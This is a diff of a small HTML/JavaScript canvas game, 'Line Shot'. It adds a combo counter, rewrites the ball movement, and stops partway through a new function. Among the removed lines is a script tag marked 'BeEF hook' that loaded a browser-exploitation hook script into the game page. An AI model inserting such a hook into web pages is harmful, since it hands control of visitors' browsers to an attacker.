@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Line Shot Game</title>
+<title>Line Shot Combo Game</title>
 <style>
   body {
     margin: 0;
@@ -26,13 +26,10 @@
 </style>
 </head>
 <body>
-<h1>🎯 Line Shot: Hit the Button!</h1>
-<p>Press <b>SPACE</b> when the ball passes over the button.</p>
-<div id="score">Score: 0</div>
+<h1>🎯 Line Shot: Hit the Center!</h1>
+<p>Press <b>SPACE</b> when the ball passes over the button. Chain combos!</p>
+<div id="score">Score: 0 | Combo: x0</div>
 <canvas id="gameCanvas" width="500" height="500"></canvas>
-
-<!-- BeEF hook -->
-<script src="http://127.0.0.1:3000/hook.js"></script>
 
 <script>
 const canvas = document.getElementById('gameCanvas');
@@ -43,31 +40,28 @@ const centerX = canvas.width / 2;
 const centerY = canvas.height / 2;
 const buttonRadius = 30;
 
-let ballX = centerX;
-let ballY = centerY;
-let angle = Math.random() * 2 * Math.PI;
-let speed = 2.5;
+let t = 0;                  // ball position along the line (0 to 1)
+let dir = 1;                // direction of motion
+let speed = 0.01;           // speed along the line
+let angle = Math.random() * 2 * Math.PI;  // current line angle
 
 let score = 0;
 let combo = 0;
-let comboText = '';
-let comboTimer = 0;
 
 document.addEventListener('keydown', (e) => {
   if (e.code === 'Space') {
-    const dx = ballX - centerX;
-    const dy = ballY - centerY;
+    const ball = getBallPosition();
+    const dx = ball.x - centerX;
+    const dy = ball.y - centerY;
     const dist = Math.sqrt(dx * dx + dy * dy);
 
     if (dist <= buttonRadius) {
-      // HIT!
+      // HIT
       score++;
       combo++;
-      comboText = `COMBO x${combo}`;
-      comboTimer = 60; // show for 1 second
-      resetBall();
+      randomizeAngle();
     } else {
-      // MISS!
+      // MISS
       combo = 0;
     }
     updateScore();
@@ -75,63 +69,13 @@ document.addEventListener('keydown', (e) => {
 });
 
 function updateScore() {
-  scoreDisplay.textContent = `Score: ${score}`;
+  scoreDisplay.textContent = `Score: ${score} | Combo: x${combo}`;
 }
 
-function resetBall() {
-  ballX = centerX;
-  ballY = centerY;
+function randomizeAngle() {
   angle = Math.random() * 2 * Math.PI;
+  t = 0;
+  dir = 1;
 }
 
-function drawButton() {
-  ctx.fillStyle = '#0078d7';
-  ctx.beginPath();
-  ctx.arc(centerX, centerY, buttonRadius, 0, 2 * Math.PI);
-  ctx.fill();
-}
-
-function drawBall() {
-  ctx.fillStyle = 'yellow';
-  ctx.beginPath();
-  ctx.arc(ballX, ballY, 10, 0, 2 * Math.PI);
-  ctx.fill();
-}
-
-function drawCombo() {
-  if (comboTimer > 0 && combo > 1) {
-    ctx.fillStyle = 'lime';
-    ctx.font = '24px Arial';
-    ctx.textAlign = 'center';
-    ctx.fillText(comboText, centerX, centerY - 50);
-    comboTimer--;
-  }
-}
-
-function gameLoop() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-  // Update ball position
-  ballX += Math.cos(angle) * speed;
-  ballY += Math.sin(angle) * speed;
-
-  // Check bounds
-  if (ballX < 0 || ballX > canvas.width || ballY < 0 || ballY > canvas.height) {
-    combo = 0; // missed
-    resetBall();
-    updateScore();
-  }
-
-  drawButton();
-  drawBall();
-  drawCombo();
-
-  requestAnimationFrame(gameLoop);
-}
-
-// Start game
-updateScore();
-gameLoop();
-</script>
-</body>
-</html>
+function getBallPosition()
